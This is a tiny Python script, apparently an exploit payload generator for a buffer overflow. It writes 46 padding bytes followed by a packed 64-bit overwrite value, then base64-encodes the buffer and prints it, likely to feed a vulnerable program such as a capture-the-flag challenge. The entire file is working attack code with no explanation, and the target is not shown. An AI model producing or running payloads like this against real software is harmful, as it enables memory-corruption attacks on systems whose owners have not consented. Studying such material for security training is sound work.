
import sys
import struct
import base64

buf = b'iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
buf += struct.pack('<Q', 15169179888148977023)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
